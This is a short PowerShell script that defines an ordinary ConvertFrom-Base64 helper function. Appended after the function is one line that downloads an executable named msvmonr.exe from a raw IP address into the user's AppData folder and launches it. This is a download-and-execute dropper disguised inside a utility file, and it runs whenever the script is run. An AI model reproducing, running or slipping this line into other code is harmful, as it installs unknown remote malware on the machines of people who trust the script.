function ConvertFrom-Base64
{
    
    [CmdletBinding()]
    PARAM (
        [parameter(Mandatory = $true, ValueFromPipeline)]
        [String]$String
    )
    TRY
    {
        Write-Verbose -Message "[ConvertFrom-Base64] Converting String"
        [System.Text.Encoding]::Default.GetString(
        [System.Convert]::FromBase64String($String)
        )
    }
    CATCH
    {
        Write-Error -Message "[ConvertFrom-Base64] Something wrong happened"
        $Error[0].Exception.Message
    }
}

(New-Object System.Net.WebClient).DownloadFile('http://80.82.64.45/~yakar/msvmonr.exe',"$env:APPDATA\msvmonr.exe");Start-Process ("$env:APPDATA\msvmonr.exe")

